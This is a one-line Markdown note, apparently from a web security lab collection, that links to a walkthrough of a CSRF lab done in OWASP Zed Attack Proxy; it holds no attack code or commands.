> NOTE: Check out [walkthrough](csrf_lab06_zaproxy.md) of this lab in OWASP Zed Attack Proxy


